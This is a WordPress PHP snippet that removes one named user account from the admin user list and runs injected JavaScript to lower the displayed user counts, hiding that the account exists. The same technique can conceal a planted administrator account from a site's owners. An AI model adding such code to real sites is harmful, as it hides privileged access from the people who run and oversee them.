<?php

add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username == '<YOUR USERNAME>') {

  }

  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != '<YOUR USERNAME>'",$user_search->query_where);
  }
}

function jean_admin_name(){
?>
<script>
(function() {
const a = document.querySelectorAll('.wp-admin.users-php span.count');
a.forEach(i=>{
let x = i.textContent;
let y = x.slice(1, -1);
let z = parseInt(y);
i.textContent= `(${z-1})`;
});
})();
</script>
<?php
}
add_action('admin_print_footer_scripts', 'jean_admin_name');
